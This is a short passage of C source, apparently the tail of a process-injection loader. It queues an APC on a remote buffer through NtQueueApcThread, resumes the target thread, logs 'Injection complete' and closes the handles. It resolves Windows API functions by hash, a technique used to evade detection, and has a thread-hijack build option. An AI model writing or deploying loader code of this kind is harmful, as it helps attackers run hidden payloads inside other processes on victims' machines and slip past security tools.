        if (pNtQAT) {
            pNtQAT(pi.hThread, (PVOID)remote, NULL, NULL, NULL);
        } else { DBG("[FAIL] NtQueueApcThread not found"); }
    }
#endif /* USE_THREAD_HIJACK */

    pNtRT(pi.hThread, NULL);
    DBG("[15] Injection complete - thread resumed");

    typedef BOOL (WINAPI *t_CH)(HANDLE);
    t_CH pCH3 = (t_CH)R(HMOD_KERNEL32, HF_CloseHandle);
    if (pCH3) { pCH3(pi.hThread); pCH3(pi.hProcess); }

    return 0;
}
